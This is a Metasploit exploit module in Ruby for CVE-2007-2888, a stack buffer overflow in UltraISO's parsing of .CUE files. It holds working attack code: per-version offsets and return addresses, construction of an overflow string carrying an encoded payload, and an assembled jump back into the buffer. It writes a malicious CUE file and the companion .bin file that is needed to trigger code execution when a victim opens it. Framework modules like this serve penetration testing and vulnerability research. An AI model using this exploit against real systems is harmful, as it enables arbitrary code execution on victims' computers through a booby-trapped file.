##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'UltraISO CUE File Parsing Buffer Overflow',
      'Description'    => %q{
          This module exploits a stack-based buffer overflow in EZB Systems, Inc's
        UltraISO. When processing .CUE files, data is read from file into a
        fixed-size stack buffer. Since no bounds checking is done, a buffer overflow
        can occur. Attackers can execute arbitrary code by convincing their victim
        to open an CUE file.

        NOTE: A file with the same base name, but the extension of "bin" must also
        exist. Opening either file will trigger the vulnerability, but the files must
        both exist.
      },
      'License'        => MSF_LICENSE,
      'Author' 	     =>
        [
          'n00b',  # original discovery
          'jduck' # metasploit version
        ],
      'References'     =>
        [
          [ 'CVE', '2007-2888' ],
          [ 'OSVDB', '36570' ],
          [ 'BID', '24140' ],
          [ 'EDB', '3978' ]
        ],
      'Payload'        =>
        {
          'Space'       => 1024,
          'BadChars'    => "\x00\x0a\x0d\x22",
          'DisableNops' => true,
          'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff",
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          # BOF @ 0x005e1f8b

          # The EXE base addr contains a bad char (nul). This prevents us from
          # writing data after the return address.  NOTE: An SEH exploit was
          # originally created for this vuln, but was tossed in favor of using
          # the return address method instead. This is due to the offset being
          # stable across different open methods.

          [ 'Windows - UltraISO v8.6.2.2011 portable',
            {
              'Offset' => 1100,
              'JmpOff' => 0x30,   # offset from the end to our jmp
              'Ret' => 0x00594740 # add esp, 0x64 / p/p/p/r in unpacked UltraISO.exe
            }
          ],
          [ 'Windows - UltraISO v8.6.0.1936',
            {
              'Offset' => 1100,
              'JmpOff' => 0x30,   # offset from the end to our jmp
              'Ret' => 0x0059170c # add esp, 0x64 / p/p/p/r in unpacked UltraISO.exe
            }
          ],
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'May 24 2007',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('FILENAME', [ true, 'The file name.',  'msf.cue']),
      ], self.class)
  end

  def exploit

    off = target['Offset']
    jmpoff = target['JmpOff']

    sploit = "\""
    sploit << payload.encoded
    sploit << rand_text_alphanumeric(off - sploit.length)

    # Smashed return address..
    sploit[off, 4] = [target.ret].pack('V')

    # We utilize a single instruction near the end of the buffer space to
    # jump back to the beginning of the buffer..
    distance = off - jmpoff
    distance -= 1 # dont execute the quote character!
    jmp = Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + distance.to_s).encode_string
    sploit[off - jmpoff, jmp.length] = jmp

    sploit << ".BIN\""

    cue_data = "FILE "
    cue_data << sploit
    cue_data << " BINARY\r\n"
    cue_data << " TRACK 01 MODE1/2352\r\n"
    cue_data << "   INDEX 01 00:00:00\r\n"

    print_status("Creating '#{datastore['FILENAME']}' using target '#{target.name}' ...")
    file_create(cue_data)

    # This extends the current class, and changes the file_format_name.
    # This allows us to use the file_create(data) to store the created
    # file in the correct directory.

    class << self
      def file_format_filename
        datastore['FILENAME'].gsub(/\.cue$/, '.bin')
      end
    end

    file_create('')
  end

end